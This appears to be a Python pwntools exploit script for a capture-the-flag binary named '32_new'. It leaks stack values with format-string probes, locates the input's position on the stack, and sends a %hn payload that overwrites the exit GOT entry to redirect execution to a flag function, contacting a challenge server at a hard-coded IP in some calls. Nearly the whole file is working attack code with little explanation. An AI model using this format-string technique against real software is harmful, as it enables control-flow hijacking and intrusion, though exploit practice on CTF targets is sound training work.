#!/usr/bin/env python

from pwn import *

#nc 163.172.176.29 9035 
#s = remote('163.172.176.29', 9035)
#s = process('./32_new')

# for testing purposes
def leakStack():
    result = ""
    for i in range(1, 100):
        s = process('./32_new')
        #s = remote('163.172.176.29', 9035)
        p = 'AAAA.%' + str(i) + '$x'
        s.sendline(p)
        s.recvline()
        result += s.recvall()
    print result

# for testing purposes, found that parameter is on 10th place in stack
def findParamPosition():
    for i in range(1, 100):
        s = remote('163.172.176.29', 9035)
        #s = process('./32_new')
        p = 'AAAA.%' + str(i) + '$x'
        s.sendline(p)
        res = s.recvall()
        if '41414141' in res:
            print 'found 41414141 at', i,'th place'
            break


# gdb 32_new -batch -n -ex "p flag" 
flag_addr = 0x804870b  # ( 2052 | 34571)  
# readelf -r 32_new | grep exit
exit_got = 0x0804a034  

# for testing purposes
#pp = p32(0xffffd3bc) + '.%10$n' 

# 8 = 4 + 4 (2 addresses), 70 = text size which being placed by program before printf call
#exit_got -> flag_addr 
pp = p32(exit_got) + p32(exit_got + 2) + '%' + str(2052 - 8 - 70) + 'x%11$hn' + '%' + str(34571 - 2052) + 'x%10$hn'

#print pp

print '\nSending payload ...'
#s = remote('163.172.176.29', 9035)
s = process('./32_new')
s.recvline()
s.sendline(pp)
print 'Done!\n'
s.interactive()



























